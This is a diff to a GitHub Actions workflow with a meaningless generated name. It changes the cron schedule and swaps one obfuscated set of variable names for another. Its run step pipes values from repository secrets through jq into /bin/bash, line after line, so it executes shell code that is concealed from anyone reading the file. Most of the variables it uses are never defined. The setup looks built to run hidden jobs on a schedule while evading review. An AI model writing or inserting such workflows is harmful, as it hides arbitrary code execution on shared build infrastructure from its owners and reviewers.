@@ -3,27 +3,27 @@ name: fabricatordispirited
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
+    - cron: '48 4/6 * * *'
 
-jobs:  # 23302
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fabricatordispirited
         env:
-          n41: ${{ secrets.n41 }}
+          akds117: ${{ secrets.akds117 }}
         run: |
-          echo $n41 | jq -r .froco1 | /bin/bash
-          echo $alkc54 | jq -r .yvcgl63 | /bin/bash
-          echo $ygcf73571 | jq -r .d1 | /bin/bash
-          echo $kl25639 | jq -r .j71 | /bin/bash
-          echo $unpse385 | jq -r .vchf9 | /bin/bash
-          echo $xaokq39 | jq -r .j5 | /bin/bash
-          echo $wsdoa4 | jq -r .nxo140 | /bin/bash
-          echo $bs25526 | jq -r .kvxph4 | /bin/bash
-          echo $bfer9987 | jq -r .imcx84347 | /bin/bash
-          echo $mq16918 | jq -r .vcbw47 | /bin/bash
-          echo $kytv6728 | jq -r .z62265 | /bin/bash
+          echo $akds117 | jq -r .rpvlu238 | /bin/bash
+          echo $klai6 | jq -r .ekuv74 | /bin/bash
+          echo $dqkf563 | jq -r .pqve59786 | /bin/bash
+          echo $bgdia8 | jq -r .i39 | /bin/bash
+          echo $mjmy23 | jq -r .ot3177 | /bin/bash
+          echo $se41274 | jq -r .z7 | /bin/bash
+          echo $vwoc651 | jq -r .tjfw9 | /bin/bash
+          echo $dkzvk2 | jq -r .srde66 | /bin/bash
+          echo $irqp9557 | jq -r .qyn8708 | /bin/bash
+          echo $bzp6677 | jq -r .bkfmy684 | /bin/bash
+          echo $l29 | jq -r .cpyak9465 | /bin/bash
+          echo $fmmin29 | jq -r .ltjfg4 | /bin/bash
 
